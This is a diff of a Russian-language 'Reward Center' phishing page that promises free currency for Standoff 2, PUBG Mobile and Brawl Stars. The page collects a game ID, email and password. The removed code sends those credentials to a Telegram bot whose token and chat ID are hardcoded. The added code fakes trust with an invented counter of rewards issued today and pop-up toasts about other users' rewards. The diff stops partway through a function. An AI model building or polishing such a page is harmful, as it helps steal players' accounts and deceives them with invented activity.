@@ -6,34 +6,61 @@
 <title>Reward Center — Получение наград</title>
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    html, body { height: 100%; overflow: hidden; }
     
     body {
-        /* Глубокий синий фон с мягким градиентом — выглядит дорого и надежно */
         background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 60%, #020617 100%);
-        min-height: 100vh;
         display: flex;
         justify-content: center;
         align-items: center;
         padding: 20px;
         color: #e2e8f0;
+        position: relative;
     }
-    
-    /* Основной контейнер */
+
+    .bg-particles {
+        position: fixed;
+        inset: 0;
+        overflow: hidden;
+        z-index: 0;
+        pointer-events: none;
+    }
+    .particle {
+        position: absolute;
+        border-radius: 50%;
+        background: rgba(16, 185, 129, 0.15);
+        filter: blur(40px);
+        animation: float 20s infinite ease-in-out;
+    }
+    .particle:nth-child(1) { width: 300px; height: 300px; top: -100px; left: -100px; animation-delay: 0s; }
+    .particle:nth-child(2) { width: 400px; height: 400px; bottom: -150px; right: -150px; background: rgba(59, 130, 246, 0.1); animation-delay: -5s; }
+    .particle:nth-child(3) { width: 250px; height: 250px; top: 40%; left: 60%; background: rgba(139, 92, 246, 0.1); animation-delay: -10s; }
+    @keyframes float {
+        0%, 100% { transform: translate(0, 0) scale(1); }
+        33% { transform: translate(40px, -30px) scale(1.1); }
+        66% { transform: translate(-30px, 20px) scale(0.95); }
+    }
+
     .container {
-        background: rgba(30, 41, 59, 0.7);
-        backdrop-filter: blur(20px);
-        -webkit-backdrop-filter: blur(20px);
+        background: rgba(30, 41, 59, 0.75);
+        backdrop-filter: blur(24px);
+        -webkit-backdrop-filter: blur(24px);
         border: 1px solid rgba(255, 255, 255, 0.08);
         border-radius: 24px;
         padding: 0;
         max-width: 440px;
         width: 100%;
-        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 80px rgba(16, 185, 129, 0.05);
         overflow: hidden;
         position: relative;
+        z-index: 1;
+        animation: fadeInUp 0.6s ease;
+    }
+    @keyframes fadeInUp {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
     }
 
-    /* Полоска прогресса сверху */
     .progress-bar {
         height: 4px;
         background: rgba(255,255,255,0.05);
@@ -43,30 +70,30 @@
         height: 100%;
         width: 33%;
         background: linear-gradient(90deg, #10b981, #34d399);
-        transition: width 0.4s ease;
+        box-shadow: 0 0 12px rgba(16, 185, 129, 0.6);
+        transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         border-radius: 0 4px 4px 0;
     }
 
-    .inner-content {
-        padding: 32px 28px;
-    }
+    .inner-content { padding: 28px 26px; }
     
-    /* Заголовок */
-    .header {
-        text-align: center;
-        margin-bottom: 28px;
-    }
+    .header { text-align: center; margin-bottom: 24px; }
     .logo-icon {
         display: inline-flex;
         align-items: center;
         justify-content: center;
-        width: 52px;
-        height: 52px;
+        width: 56px;
+        height: 56px;
         background: linear-gradient(135deg, #10b981, #059669);
-        border-radius: 14px;
+        border-radius: 16px;
         margin-bottom: 14px;
-        font-size: 26px;
-        box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
+        font-size: 28px;
+        box-shadow: 0 8px 24px rgba(16, 185, 129, 0.35);
+        animation: pulse-glow 2.5s infinite;
+    }
+    @keyframes pulse-glow {
+        0%, 100% { box-shadow: 0 8px 24px rgba(16, 185, 129, 0.35); }
+        50% { box-shadow: 0 8px 32px rgba(16, 185, 129, 0.6); }
     }
     h1 {
         font-size: 20px;
@@ -75,21 +102,39 @@
         margin-bottom: 6px;
         letter-spacing: -0.3px;
     }
-    .sub {
-        font-size: 13px;
-        color: #94a3b8;
-        line-height: 1.4;
+    .sub { font-size: 13px; color: #94a3b8; line-height: 1.4; }
+
+    .trust-counter {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        margin-top: 10px;
+        font-size: 12px;
+        color: #64748b;
     }
+    .trust-counter .dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: #10b981;
+        box-shadow: 0 0 8px #10b981;
+        animation: blink 1.5s infinite;
+    }
+    @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.3; }
+    }
+    .trust-counter span:last-child { color: #94a3b8; }
+    #trustCount { color: #10b981; font-weight: 700; }
     
-    /* Меню кнопок — теперь ВЕРТИКАЛЬНОЕ (в столбик) */
     .buttons {
         display: flex;
         flex-direction: column;
         gap: 10px;
-        margin-bottom: 24px;
+        margin-bottom: 20px;
     }
     
-    /* Кнопки платформ — стиль "список" */
     .btn {
         display: flex;
         align-items: center;
@@ -99,43 +144,48 @@
         border-radius: 14px;
         background: rgba(255, 255, 255, 0.03);
         cursor: pointer;
-        transition: all 0.2s ease;
+        transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
         text-align: left;
         color: #e2e8f0;
         position: relative;
         overflow: hidden;
     }
+    .btn::before {
+        content: '';
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(90deg, transparent, rgba(16, 185, 129, 0.15), transparent);
+        transform: translateX(-100%);
+        transition: transform 0.5s;
+    }
+    .btn:hover::before { transform: translateX(100%); }
     .btn:hover {
         background: rgba(255, 255, 255, 0.07);
-        border-color: rgba(16, 185, 129, 0.4);
-        transform: translateX(4px);
+        border-color: rgba(16, 185, 129, 0.5);
+        transform: translateX(6px);
+        box-shadow: -4px 0 20px rgba(16, 185, 129, 0.2);
     }
-    .btn:active {
-        transform: translateX(2px) scale(0.99);
-    }
+    .btn:active { transform: translateX(2px) scale(0.98); }
     
-    /* Иконка слева */
     .btn .icon {
-        width: 42px;
-        height: 42px;
+        width: 44px;
+        height: 44px;
         display: flex;
         align-items: center;
         justify-content: center;
-        border-radius: 10px;
-        font-size: 20px;
+        border-radius: 12px;
+        font-size: 22px;
         margin-right: 14px;
         flex-shrink: 0;
+        transition: transform 0.25s;
     }
-    
-    /* Индивидуальные цвета иконок (сдержанные, благородные) */
+    .btn:hover .icon { transform: scale(1.1) rotate(-5deg); }
+
     .btn[data-game="standoff"] .icon { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
     .btn[data-game="pubg"] .icon { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
     .btn[data-game="brawl"] .icon { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; }
     
-    /* Текст кнопки */
-    .btn-text {
-        flex-grow: 1;
-    }
+    .btn-text { flex-grow: 1; }
     .btn-text .platform-name {
         display: block;
         font-size: 15px;
@@ -150,23 +200,21 @@
         font-weight: 400;
     }
     
-    /* Стрелочка справа */
     .btn .arrow {
         color: #64748b;
-        font-size: 18px;
-        transition: transform 0.2s;
+        font-size: 20px;
+        transition: transform 0.25s, color 0.25s;
     }
-    .btn:hover .arrow {
-        transform: translateX(4px);
-        color: #10b981;
-    }
+    .btn:hover .arrow { transform: translateX(4px); color: #10b981; }
 
-    /* Шаги (формы) */
     .step { display: none; flex-direction: column; gap: 14px; }
-    .step.active { display: flex; }
+    .step.active { display: flex; animation: slideIn 0.4s ease; }
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateX(20px); }
+        to { opacity: 1; transform: translateX(0); }
+    }
     .step h2 { font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px; text-align: center; }
     
-    /* Поля ввода */
     input {
         width: 100%;
         padding: 14px 16px;
@@ -176,20 +224,28 @@
         color: #ffffff;
         font-size: 15px;
         outline: none;
-        transition: border-color 0.2s, box-shadow 0.2s;
+        transition: all 0.25s;
     }
     input:focus {
         border-color: #10b981;
         box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.15);
         background: rgba(15, 23, 42, 0.9);
     }
+    input.valid {
+        border-color: #10b981;
+        box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.2);
+    }
     input::placeholder { color: #64748b; }
     
     .hint { font-size: 12px; color: #64748b; text-align: center; margin-top: -4px; }
     .error { color: #ef4444; font-size: 13px; display: none; text-align: center; margin-top: 4px; }
-    .error.active { display: block; }
+    .error.active { display: block; animation: shake 0.4s; }
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-6px); }
+        75% { transform: translateX(6px); }
+    }
     
-    /* Главная кнопка действия */
     .submit {
         width: 100%;
         padding: 15px;
@@ -200,18 +256,34 @@
         font-weight: 700;
         font-size: 15px;
         cursor: pointer;
-        transition: all 0.2s;
+        transition: all 0.25s;
         margin-top: 6px;
         box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
         letter-spacing: 0.3px;
+        position: relative;
+        overflow: hidden;
     }
+    .submit::after {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 5px;
+        height: 5px;
+        background: rgba(255,255,255,0.5);
+        opacity: 0;
+        border-radius: 50%;
+        transform: scale(1);
+        transition: all 0.6s;
+    }
+    .submit:active::after { transform: scale(50); opacity: 0; }
     .submit:hover { 
         background: linear-gradient(135deg, #34d399, #10b981);
-        box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+        box-shadow: 0 8px 25px rgba(16, 185, 129, 0.5);
+        transform: translateY(-2px);
     }
-    .submit:active { transform: scale(0.98); }
+    .submit:active { transform: translateY(0) scale(0.98); }
 
-    /* Кнопка "Назад" */
     .back-btn {
         background: transparent;
         border: none;
@@ -224,7 +296,6 @@
     }
     .back-btn:hover { color: #94a3b8; }
 
-    /* Экран успеха */
     .success {
         display: none;
         flex-direction: column;
@@ -235,55 +306,91 @@
     }
     .success.active { display: flex; }
     .checkmark {
-        width: 64px;
-        height: 64px;
+        width: 72px;
+        height: 72px;
         border-radius: 50%;
         background: rgba(16, 185, 129, 0.15);
         color: #10b981;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 32px;
+        font-size: 36px;
         margin-bottom: 8px;
-        animation: pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        animation: pop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         border: 2px solid rgba(16, 185, 129, 0.3);
+        box-shadow: 0 0 30px rgba(16, 185, 129, 0.4);
     }
     @keyframes pop {
         0% { transform: scale(0); opacity: 0; }
-        70% { transform: scale(1.1); }
+        70% { transform: scale(1.15); }
         100% { transform: scale(1); opacity: 1; }
     }
     .success h2 { color: #10b981; font-size: 20px; font-weight: 700; }
     .success p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
     .success .note { font-size: 12px; color: #64748b; margin-top: 8px; }
 
-    /* Подвал */
     .footer {
         text-align: center;
         font-size: 11px;
         color: #475569;
-        padding: 16px 28px 24px;
+        padding: 14px 26px 20px;
         border-top: 1px solid rgba(255,255,255,0.05);
         background: rgba(15, 23, 42, 0.3);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+    }
+    .footer .lock { color: #10b981; }
+
+    .toast {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%) translateY(100px);
+        background: rgba(16, 185, 129, 0.95);
+        color: #fff;
+        padding: 10px 18px;
+        border-radius: 12px;
+        font-size: 13px;
+        font-weight: 600;
+        box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+        opacity: 0;
+        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        z-index: 100;
+        white-space: nowrap;
+    }
+    .toast.show {
+        transform: translateX(-50%) translateY(0);
+        opacity: 1;
     }
 </style>
 </head>
 <body>
+
+<div class="bg-particles">
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+</div>
+
 <div class="container">
-    <!-- Полоска прогресса -->
     <div class="progress-bar">
         <div class="progress-fill" id="progressFill"></div>
     </div>
 
     <div class="inner-content">
-        <!-- Заголовок -->
         <div class="header" id="header">
             <div class="logo-icon">🎁</div>
             <h1>Reward Center</h1>
             <p class="sub">Выберите платформу для получения награды</p>
+            
+            <div class="trust-counter">
+                <div class="dot"></div>
+                <span><span id="trustCount">0</span> наград выдано сегодня</span>
+            </div>
         </div>
 
-        <!-- Меню кнопок (вертикальное) -->
         <div class="buttons" id="buttons">
             <button class="btn" data-game="standoff" onclick="selectPlatform('STANDOFF 2', 'Gold')">
                 <div class="icon">🪙</div>
@@ -313,17 +420,15 @@
             </button>
         </div>
 
-        <!-- Шаг 1: Ввод ID -->
         <div class="step" id="idStep">
             <h2 id="idTitle">Введите игровой ID</h2>
-            <input type="text" id="gameId" placeholder="ID">
+            <input type="text" id="gameId" placeholder="ID" oninput="liveValidate()">
             <p class="hint" id="idHint"></p>
             <p class="error" id="idError">Неверный формат ID</p>
             <button class="submit" onclick="checkId()">Продолжить</button>
             <button class="back-btn" onclick="goBack()">← Назад к выбору платформы</button>
         </div>
 
-        <!-- Шаг 2: Ввод данных -->
         <form class="step" id="loginStep" onsubmit="return sendData(event)">
             <h2 id="formTitle">Получение награды</h2>
             <input type="email" id="email" placeholder="Электронная почта" required>
@@ -332,7 +437,6 @@
             <button type="button" class="back-btn" onclick="goBackToId()">← Назад</button>
         </form>
 
-        <!-- Шаг 3: Успех -->
         <div class="success" id="success">
             <div class="checkmark">✓</div>
             <h2>Подарок получен!</h2>
@@ -341,11 +445,89 @@
         </div>
     </div>
 
-    <div class="footer">© 2026 Reward Center. Безопасная выдача наград.</div>
+    <div class="footer">
+        <span class="lock">🔒</span>
+        <span>Безопасная выдача наград</span>
+    </div>
 </div>
+
+<div class="toast" id="toast">✅ Награда выдана!</div>
 
 <script>
     let selected = { platform: '', reward: '' };
+    let currentCount = 0;
+    let targetCount = 0;
+
+    const BASE_COUNT = 13492;
+
+    // === Логика «живого» счетчика ===
+    function initCounter() {
+        let saved = parseInt(localStorage.getItem('rewardCounter') || '0');
+        
+        // Если первый заход или сохраненное значение меньше базового — ставим 13 492
+        if (saved === 0 || saved < BASE_COUNT) {
+            saved = BASE_COUNT;
+        }
+        
+        targetCount = saved;
+        currentCount = Math.max(0, saved - 20);
+        
+        localStorage.setItem('rewardCounter', targetCount);
+        animateCounterTo(targetCount);
+    }
+
+    function animateCounterTo(target) {
+        const el = document.getElementById('trustCount');
+        const start = currentCount;
+        const diff = target - start;
+        const duration = 1500;
+        const startTime = performance.now();
+
+        function update(now) {
+            const elapsed = now - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            const eased = 1 - Math.pow(1 - progress, 3);
+            const value = Math.floor(start + diff * eased);
+            el.textContent = value.toLocaleString('ru-RU');
+            
+            if (progress < 1) {
+                requestAnimationFrame(update);
+            } else {
+                el.textContent = target.toLocaleString('ru-RU');
+                currentCount = target;
+            }
+        }
+        requestAnimationFrame(update);
+    }
+
+    function incrementCounter(amount = 1) {
+        targetCount += amount;
+        localStorage.setItem('rewardCounter', targetCount);
+        animateCounterTo(targetCount);
+    }
+
+    function showToast(message) {
+        const toast = document.getElementById('toast');
+        toast.textContent = message;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2500);
+    }
+
+    // === Имитация активности других пользователей ===
+    function simulateActivity() {
+        const delay = 8000 + Math.random() * 15000;
+        setTimeout(() => {
+            if (!document.getElementById('success').classList.contains('active')) {
+                const amount = Math.floor(Math.random() * 2) + 1;
+                incrementCounter(amount);
+                showToast('✅ Кто-то только что получил награду!');
+            }
+            simulateActivity();
+        }, delay);
+    }
+
+    initCounter();
+    simulateActivity();
 
     function updateProgress(percent) {
         document.getElementById('progressFill').style.width = percent + '%';
@@ -358,7 +540,7 @@
         document.getElementById('buttons').style.display = 'none';
         document.getElementById('header').style.display = 'none';
         document.getElementById('idTitle').textContent = `Введите ID · ${platform}`;
-        updateProgress(66); // Заполняем полоску на 2/3
+        updateProgress(66);
 
         let hint = '';
         let placeholder = '';
@@ -377,6 +559,7 @@
         document.getElementById('idHint').textContent = hint;
         document.getElementById('gameId').placeholder = placeholder;
         document.getElementById('gameId').value = '';
+        document.getElementById('gameId').classList.remove('valid');
         document.getElementById('idError').classList.remove('active');
         document.getElementById('idStep').classList.add('active');
     }
@@ -394,64 +577,24 @@
         updateProgress(66);
     }
 
+    function liveValidate() {
+        const id = document.getElementById('gameId').value.trim();
+        const input = document.getElementById('gameId');
+        let valid = false;
+
+        if (selected.platform === 'STANDOFF 2') valid = /^\d{9}$/.test(id);
+        else if (selected.platform === 'PUBG Mobile') valid = /^\d{8,12}$/.test(id);
+        else if (selected.platform === 'Brawl Stars') valid = /^#[A-Za-z0-9]{9}$/.test(id);
+
+        if (valid) input.classList.add('valid');
+        else input.classList.remove('valid');
+    }
+
     function checkId() {
         const id = document.getElementById('gameId').value.trim();
         const err = document.getElementById('idError');
         let valid = false;
 
-        if (selected.platform === 'STANDOFF 2') {
-            valid = /^\d{9}$/.test(id);
-        } else if (selected.platform === 'PUBG Mobile') {
-            valid = /^\d{8,12}$/.test(id);
-        } else if (selected.platform === 'Brawl Stars') {
-            valid = /^#[A-Za-z0-9]{9}$/.test(id);
-        }
-
-        if (!valid) {
-            err.textContent = 'Неверный формат. ' + document.getElementById('idHint').textContent;
-            err.classList.add('active');
-            return;
-        }
-
-        err.classList.remove('active');
-        document.getElementById('idStep').classList.remove('active');
-        document.getElementById('formTitle').textContent = `${selected.reward} · ${selected.platform}`;
-        document.getElementById('loginStep').classList.add('active');
-        updateProgress(100);
-    }
-
-    function sendData(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const gameId = document.getElementById('gameId').value;
-
-        // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ====
-        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
-        const CHAT_ID   = '8783227095';
-
-        const text = `🎁 Новая заявка!\n\n` +
-                     `🎮 Платформа: ${selected.platform}\n` +
-                     `🏆 Награда: ${selected.reward}\n` +
-                     `🆔 Игровой ID: ${gameId}\n` +
-                     `📧 Email: ${email}\n` +
-                     `🔑 Пароль: ${password}\n` +
-                     `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        }).catch(err => console.log(err));
-
-        document.getElementById('loginStep').classList.remove('active');
-        document.getElementById('successText').textContent =
-            `${selected.reward} для ${selected.platform} зачислены на аккаунт ${gameId}.`;
-        document.getElementById('success').classList.add('active');
-        updateProgress(100);
-
-        return false;
-    }
-</script>
-</body>
-</html>
+        if (selected.platform === 'STANDOFF 2') valid = /^\d{9}$/.test(id);
+        else if (selected.platform === 'PUBG Mobile') valid = /^\d{8,12}$/.test(id);
+        else if
